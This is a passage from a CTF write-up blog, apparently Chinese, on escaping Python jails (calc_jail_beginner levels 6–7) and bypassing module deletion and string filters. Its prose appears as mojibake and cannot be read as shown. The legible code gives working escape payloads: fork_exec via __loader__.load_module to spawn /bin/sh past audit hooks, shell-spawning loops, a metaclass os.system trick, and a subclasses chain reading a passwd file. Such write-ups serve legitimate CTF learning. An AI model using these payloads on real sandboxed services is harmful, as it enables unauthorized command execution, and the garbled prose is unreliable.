class="built_in">print</span>(err)</span><br><span class="line">  </span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure></div><p>è¿™é¢˜å·²ç»å‡ ä¹æŠŠæ‰€æœ‰çš„ hook ç»™ ban æ‰äº†ã€‚å‚è€ƒè¿™ä¸ª writeupï¼š<a class="link" href="https://ctftime.org/writeup/31883">https://ctftime.org/writeup/31883 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>ä¹Ÿå°±æ˜¯åˆ©ç”¨ <code>_posixsubprocess.fork_exec</code>  æ¥å®ç° RCEã€‚ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œä¸åŒçš„ python ç‰ˆæœ¬çš„ <code>_posixsubprocess.fork_exec</code>  æ¥å—çš„å‚æ•°ä¸ªæ•°å¯èƒ½ä¸ä¸€æ ·ï¼šä¾‹å¦‚æœ¬åœ° WSL çš„ python ç‰ˆæœ¬ä¸º 3.8.10ï¼Œè¯¥å‡½æ•°æ¥å— 17 ä¸ªå‚æ•°ï¼›è€Œè¿œç¨‹ python ç‰ˆæœ¬ä¸º 3.10.6ï¼Œè¯¥å‡½æ•°å’Œä¸Šé¢çš„ writeup æ¥å— 21 ä¸ªå‚æ•°ã€‚</p><p>è€Œä¸”æ³¨æ„åˆ°ï¼Œç›´æ¥ <code>import _posixsubprocess</code>  çš„è¯ï¼Œä¼šè§¦å‘ <code>audit hook</code> ï¼š</p><p>å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•ç»•è¿‡ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[&#x27;__loader__&#x27;].load_module(&#x27;_posixsubprocess&#x27;)</span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;)</span><br></pre></td></tr></table></figure></div><p>è€Œä¸”å› ä¸ºæ˜¯å¤šæ¬¡ execï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å…¥å¤šè¡Œä»£ç ï¼š</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1,*(os.pipe()), False, False, None, None, None, -1, None)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/09/lo3wgxhXz1eri89.png" alt="image.png"></p><h3 id="calc_jail_beginner_level61"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level61">#</a> calc_jail_beginner_level6.1</h3><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  _                _                           _       _ _   _                _   __</span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | / /</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_</span><br><span class="line"> | <span class="string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/                                                                        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Welcome to the python jail</span></span><br><span class="line"><span class="string">Let&#x27;</span>s have an beginner jail of calc</span><br><span class="line">Enter your expression <span class="keyword">and</span> I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">White <span class="built_in">list</span> of audit hook ===&gt; builtins.<span class="built_in">input</span>,builtins.<span class="built_in">input</span>/result,<span class="built_in">exec</span>,<span class="built_in">compile</span></span><br><span class="line">Some code of python jail:</span><br><span class="line"></span><br><span class="line">    dict_global = <span class="built_in">dict</span>()</span><br><span class="line">    input_code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    complie_code = <span class="built_in">compile</span>(input_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(complie_code, dict_global)</span><br><span class="line"></span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure></div><p>å’Œä¸Šé¢é‚£é¢˜ä¸åŒï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä»…æœ‰ä¸€æ¬¡ä»£ç æ‰§è¡Œæœºä¼šã€‚</p><p>ä¸è¿‡ä¸æ…Œï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°äº† python 3.8 å¼•å…¥çš„æµ·è±¡è¿ç®—ç¬¦ï¼Œè¿˜æ˜¯å¯ä»¥é€šè¿‡ç”¨æµ·è±¡è¿ç®—ç¬¦å’Œ <code>list</code>  çš„æ–¹å¼å¼„å‡ºä»£ç ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[os := <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>), _posixsubprocess := __loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>), _posixsubprocess.fork_exec([<span class="string">b&quot;/bin/sh&quot;</span>], [<span class="string">b&quot;/bin/sh&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>)]</span><br></pre></td></tr></table></figure></div><p>ä½†æ˜¯ payload å‘é€è¿‡å»ä¹‹åï¼Œèƒ½å¼¹ shellï¼Œä½†æ˜¯ shell ç§’å…³ï¼Œè¾“å…¥ä»»ä½•å‘½ä»¤ä¹Ÿä¸è§å›æ˜¾ã€‚</p><p>å¯ä»¥çœ‹çœ‹å‡è®¾æˆ‘ä»¬æš´åŠ›å¤šæ¬¡å°è¯•èµ· shellï¼Œä¼šå‘ç”Ÿä»€ä¹ˆï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[os := <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>), _posixsubprocess := __loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>), [_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/sh&quot;</span>], [<span class="string">b&quot;/bin/sh&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>)]]</span><br></pre></td></tr></table></figure></div><p>å…ˆå°†è¦æ‰§è¡Œçš„ shell å‘½ä»¤å¤åˆ¶è¿›å‰ªè´´æ¿ï¼Œç„¶ååœ¨å®ƒç–¯ç‹‚å›æ˜¾çš„æ—¶å€™ï¼Œç–¯ç‹‚ç²˜è´´å›è½¦ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰§è¡Œã€‚ç»“æœå±…ç„¶æœ‰ä¸€å®šæ¦‚ç‡ä¼šå›æ˜¾æ‰§è¡Œå‘½ä»¤çš„ç»“æœï¼äºæ˜¯å°±åœ¨è¿™ç§ç ´çƒ‚ shell ä¸‹æ‹¿åˆ°äº† flagâ€¦â€¦</p><p>ä¸è¿‡è¿˜æœ‰æ›´åŠ ä¼˜é›…ï¼ˆï¼Ÿï¼‰çš„åšæ³•ï¼šåˆ©ç”¨ <code>itertools</code>  ä¸­çš„<a class="link" href="https://zhuanlan.zhihu.com/p/34139147">æ— é™è¿­ä»£å™¨ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>æ¥æš´åŠ›èµ· shellã€‚ä¸è¿‡å®æµ‹å¥½åƒå¹¶è¾¾ä¸åˆ°æ— é™ï¼šçŒœæµ‹è¿œç¨‹èµ·è¿›ç¨‹çš„ä¸ªæ•°æœ‰é™ï¼Œåˆ°ä¸€å®šæ•°ç›®ä¹‹åä¼šç‚¸ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[os := <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>), itertools := __loader__.load_module(<span class="string">&#x27;itertools&#x27;</span>), _posixsubprocess := __loader__.load_module(<span class="string">&#x27;_posixsubprocess&#x27;</span>), [_posixsubprocess.fork_exec([<span class="string">b&quot;/bin/sh&quot;</span>], [<span class="string">b&quot;/bin/sh&quot;</span>], <span class="literal">True</span>, (), <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>, *(os.pipe()), <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, -<span class="number">1</span>, <span class="literal">None</span>) <span class="keyword">for</span> i <span class="keyword">in</span> itertools.count(<span class="number">0</span>)]]</span><br></pre></td></tr></table></figure></div><h3 id="calc_jail_beginner_level7"><a class="markdownIt-Anchor" href="#calc_jail_beginner_level7">#</a> calc_jail_beginner_level7</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">G</span><br><span class="line">=================================================================================================</span><br><span class="line">==        Black List AST:                                                                      ==</span><br><span class="line">==                       &#x27;Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==</span><br><span class="line">==                        Sub,Mult,Div,Del&#x27;                                                    ==</span><br><span class="line">=================================================================================================</span><br></pre></td></tr></table></figure></div><p>è™½ç„¶æ²¡æœ‰äº† import å’Œ callï¼Œä½†æœ‰ä¸€ä¸ªé­”æœ¯æ–¹æ³•<a class="link" href="https://zhuanlan.zhihu.com/p/149126959"> metaclass <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ã€‚å¯ä»¥é€šè¿‡ metaclass ç»™ç±»æ·»åŠ å±æ€§ã€‚</p><p>çŒœæµ‹ä¸€ä¸‹ï¼Œæ—¢ç„¶èƒ½æ·»åŠ ç±»çš„å±æ€§ï¼Œé‚£æ˜¯å¦å¯ä»¥ä¿®æ”¹å‘¢ï¼Ÿä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬å°†ä¸€ä¸ªç±»çš„æŸä¸€ä¸ªå±æ€§ä¿®æ”¹ä¸º <code>os.system</code>  è¿™æ ·çš„å‡½æ•°ï¼Œé‚£ä¹ˆè¿™æ ·ä¸€æ¥åœ¨æˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™å°±å¯ä»¥æ‰§è¡Œäº†ã€‚ç°åœ¨çš„é—®é¢˜æ˜¯éœ€è¦ä¸€ä¸ªå¯ä»¥ä¼ å…¥å­—ç¬¦ä¸²çš„å±æ€§ï¼Œå‘ç°æ­£å¥½ <code>__getitem__</code> ç¬¦åˆæ¡ä»¶ã€‚</p><p><code>__getitem__</code> æ˜¯ç”¨æ¥å–åˆ—è¡¨æˆ–è€…å­—å…¸çš„å€¼çš„ä¸€ä¸ªå±æ€§ï¼Œå¦‚æœæˆ‘ä»¬å°†ä¸€ä¸ªç±»çš„ <code>__getitem__</code> æ”¹ä¸º <code>os.system</code>  çš„è¯æ˜¯ä¸æ˜¯å°±å¯ä»¥æ‰§è¡Œ shell äº†å“ˆå“ˆ</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WOOD</span>():</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">WOOD.__getitem__=os.system</span><br><span class="line">WOOD()[<span class="string">&#x27;ls&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>è¿è¡Œåå‘ç°æ‰§è¡Œäº† ls ä½†è¿™æ ·ä¾ç„¶æ— æ³•è§£å†³è¿™ä¸ªé¢˜ï¼Œå¦‚æœæˆ‘ä»¬å°†ä¸Šè¿°ä»£ç è½¬ä¸º AST æŸ¥çœ‹ï¼Œä¼šå‘ç°æœ‰ Call å’Œ Expr</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line">src=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">import os</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class WOOD():</span></span><br><span class="line"><span class="string">pass</span></span><br><span class="line"><span class="string">WOOD.__getitem__=os.system</span></span><br><span class="line"><span class="string">WOOD()[&#x27;ls&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">ast_node = ast.parse(src, <span class="string">&quot;test&quot;</span>, mode=<span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ast.dump(ast_node))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Module(body=[Import(names=[alias(name=&#x27;os&#x27;, asname=None)]), ClassDef(name=&#x27;WOOD&#x27;, bases=[], keywords=[], body=[Pass()], decorator_list=[]), Assign(targets=[Attribute(value=Name(id=&#x27;WOOD&#x27;, ctx=Load()), attr=&#x27;__getitem__&#x27;, ctx=Store())], value=Attribute(value=Name(id=&#x27;os&#x27;, ctx=Load()), attr=&#x27;system&#x27;, ctx=Load()), type_comment=None), Expr(value=Subscript(value=Call(func=Name(id=&#x27;WOOD&#x27;, ctx=Load()), args=[], keywords=[]), slice=Index(value=Constant(value=&#x27;ls&#x27;, kind=None)), ctx=Load()))], type_ignores=[])</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></div><p>å¯¹äºå¦‚ä½•é¿å¼€ <code>Expr</code> ï¼Œæˆ‘ä»¬ç»™æ‰§è¡Œçš„å†…å®¹èµ‹å€¼å°±è¡Œã€‚</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmp = WOOD()[<span class="string">&#x27;ls&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p>å¦‚ä½•ç»•è¿‡ <code>Call</code> ï¼Ÿå¯ä»¥ç”¨ <code>metaclass</code> ï¼Œæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªç±»çš„ <code>__getitem__==os.system</code> ï¼Œä½¿ç”¨ mateclass å¯ä»¥è®©ç±»æ‹¥æœ‰å±æ€§ï¼Œä½†ä¸æ˜¯ç±»ç”Ÿæˆçš„å¯¹è±¡å…·æœ‰è¿™ä¸ªå±æ€§ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨è°ƒç”¨å®ä¾‹åŒ–ç±»çš„ Callï¼Œä»è€Œè¿›è¡Œç»•è¿‡ Callã€‚</p><p>å› æ­¤æœ€ç»ˆ payload ä¸º:</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WOOD</span>(<span class="title class_ inherited__">type</span>):</span><br><span class="line">    __getitem__=os.system</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WHALE</span>(metaclass=WOOD):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">tmp = WHALE[<span class="string">&#x27;sh&#x27;</span>]</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/05/09/KHuyBwsjt1FZEQP.png" alt="image.png"></p><h2 id="rce"><a class="markdownIt-Anchor" href="#rce">#</a> RCE</h2><h3 id="ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•"><a class="markdownIt-Anchor" href="#ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•">#</a> ç»•è¿‡åˆ é™¤æ¨¡å—æˆ–æ–¹æ³•</h3><p><code>del</code>  ä¼šåˆ é™¤æ¨¡å—æˆ–æ–¹æ³•ï¼Œæ¯”å¦‚ä¸‹é¢åˆ é™¤äº† <code>builitins</code>  æ¨¡å—çš„ <code>eval</code>  æ–¹æ³•</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br></pre></td></tr></table></figure></div><h4 id="reloadé‡åŠ è½½"><a class="markdownIt-Anchor" href="#reloadé‡åŠ è½½">#</a> reload é‡åŠ è½½</h4><p>reload å¯ä»¥é‡æ–°åŠ è½½è¢«åˆ é™¤çš„æ¨¡å—</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">KeyError: <span class="string">&#x27;eval&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure></div><p>åœ¨ Python 3 ä¸­ï¼Œ <code>reload() </code> å‡½æ•°è¢«ç§»åŠ¨åˆ° <code>importlib</code>  æ¨¡å—ä¸­ï¼Œæ‰€ä»¥å¦‚æœè¦ä½¿ç”¨  <code>reload()</code>  å‡½æ•°ï¼Œéœ€è¦å…ˆå¯¼å…¥ <code>importlib</code>  æ¨¡å—ã€‚</p><h4 id="æ¢å¤-sysmodules"><a class="markdownIt-Anchor" href="#æ¢å¤-sysmodules">#</a> æ¢å¤ sys.modules</h4><p>ä¸€äº›è¿‡æ»¤ä¸­å¯èƒ½å°†  <code>sys.modules['os']</code>  è¿›è¡Œä¿®æ”¹ã€‚è¿™ä¸ªæ—¶å€™å³ä½¿å°† os æ¨¡å—å¯¼å…¥è¿›æ¥ï¼Œä¹Ÿæ˜¯æ— æ³•ä½¿ç”¨çš„.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;system&#x27;</span></span><br></pre></td></tr></table></figure></div><p>ç”±äºå¾ˆå¤šåˆ«çš„å‘½ä»¤æ‰§è¡Œåº“ä¹Ÿä½¿ç”¨åˆ°äº† os, å› æ­¤ä¹Ÿä¼šå—åˆ°ç›¸åº”çš„å½±å“ï¼Œä¾‹å¦‚ subprocess</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;</span>, line <span class="number">688</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Popen</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">  File <span class="string">&quot;/home/kali/.pyenv/versions/3.8.10/lib/python3.8/subprocess.py&quot;</span>, line <span class="number">1708</span>, <span class="keyword">in</span> Popen</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_handle_exitstatus</span>(<span class="params">self, sts, _WIFSIGNALED=os.WIFSIGNALED,</span></span><br><span class="line"><span class="params">AttributeError: <span class="string">&#x27;str&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;WIFSIGNALED&#x27;</span></span></span><br></pre></td></tr></table></figure></div><p>ç”±äº import å¯¼å…¥æ¨¡å—æ—¶ä¼šæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰è¿™ä¸ªç±»ï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œæ²¡æœ‰åˆ™åŠ è½½ã€‚å› æ­¤æˆ‘ä»¬åªéœ€è¦å°† os æ¨¡å—åˆ é™¤ï¼Œç„¶åå†æ¬¡å¯¼å…¥å³å¯.</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>] <span class="comment">#åˆ é™¤osæ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> os <span class="comment">#é‡æ–°å¯¼å…¥</span></span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h4 id="åŸºäºç»§æ‰¿é“¾è·å–"><a class="markdownIt-Anchor" href="#åŸºäºç»§æ‰¿é“¾è·å–">#</a> åŸºäºç»§æ‰¿é“¾è·å–</h4><p>åœ¨æ¸…ç©ºäº†  <code>__builtins__</code> çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ç´¢å¼• subclasses æ¥æ‰¾åˆ°è¿™äº›å†…å»ºå‡½æ•°ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ ¹æ®ç¯å¢ƒæ‰¾åˆ° bytes çš„ç´¢å¼•ï¼Œæ­¤å¤„ä¸º 5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__base__.__subclasses__()[<span class="number">5</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;bytes&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div><p>åœ¨ä¸Šé¢ <code>calc_jail_beginner_level4.1</code>  é¢˜ç›®ä¸­è¿ç”¨åˆ°äº†è¿™ä¸ªæ–¹å¼</p><h3 id="ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤"><a class="markdownIt-Anchor" href="#ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤">#</a> ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤</h3><h4 id="å­—ç¬¦ä¸²è½¬æ¢"><a class="markdownIt-Anchor" href="#å­—ç¬¦ä¸²è½¬æ¢">#</a> å­—ç¬¦ä¸²è½¬æ¢</h4><h5 id="å­—ç¬¦ä¸²æ‹¼æ¥"><a class="markdownIt-Anchor" href="#å­—ç¬¦ä¸²æ‹¼æ¥">#</a> å­—ç¬¦ä¸²æ‹¼æ¥</h5><p>åœ¨æˆ‘ä»¬çš„ payload ä¸­ï¼Œä¾‹å¦‚å¦‚ä¸‹çš„ payloadï¼Œ <code>__builtins__</code>   <code>file</code>  è¿™äº›å­—ç¬¦ä¸²å¦‚æœè¢«è¿‡æ»¤äº†ï¼Œå°±å¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å˜æ¢çš„æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;file&#x27;</span>](<span class="string">&#x27;E:/passwd&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span 